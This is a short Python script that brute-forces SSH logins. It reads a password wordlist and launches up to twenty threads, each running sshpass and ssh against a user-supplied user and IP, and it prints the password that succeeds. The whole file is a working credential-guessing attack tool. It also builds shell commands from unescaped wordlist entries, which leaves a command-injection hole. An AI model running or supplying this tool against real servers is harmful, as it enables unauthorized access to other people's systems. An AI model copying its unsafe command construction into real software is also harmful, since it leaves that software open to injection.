#!/bin/python3

import os
import sys
import threading
import time
import argparse

# Argument Parsing
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--u', required=True)
parser.add_argument('-ip', '--ip', required=True)
parser.add_argument('-f', '--file', default="yes.txt")
args = parser.parse_args()

user = args.u
ip = args.ip
file = args.file

# Read password file
try:
    with open(file, "r") as f:
        passwordsArray = [line.strip() for line in f.readlines()]
except FileNotFoundError:
    print(f"Error: File '{file}' not found.")
    sys.exit(1)

# Concurrency Settings
MAX_THREADS = 20  # Adjust based on system resources
stop_event = threading.Event()  # Thread-safe flag

# SSH Login Attempt
def login(password):
    if stop_event.is_set():  # Stop early if password found
        return
    
    cmd = f"sshpass -p '{password}' ssh {user}@{ip} 2>/dev/null exit"
    if os.system(cmd) == 0:
        print(f"[*] Password found: {password} [*]")
        stop_event.set()  # Stop all threads

# Thread Management
threads = []
for i, password in enumerate(passwordsArray):
    if stop_event.is_set():
        break  # Stop early if password is found

    t = threading.Thread(target=login, args=(password,))
    threads.append(t)
    t.start()

    if len(threads) >= MAX_THREADS:  
        for t in threads:
            t.join()  # Wait for threads to finish
        threads.clear()  # Reset the thread list

# Ensure all threads complete before exiting
for t in threads:
    t.join()

print("Exiting...")
